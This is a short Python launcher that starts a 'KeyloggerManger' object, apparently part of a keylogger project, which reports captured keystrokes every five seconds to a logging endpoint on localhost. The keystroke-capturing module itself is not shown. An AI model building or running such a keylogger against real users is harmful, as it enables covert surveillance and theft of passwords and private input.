from keylogger_manger import KeyloggerManger

if __name__ == "__main__":
    manager = KeyloggerManger(interval=5, server_url="http://127.0.0.1:8000/log")
    manager.run()
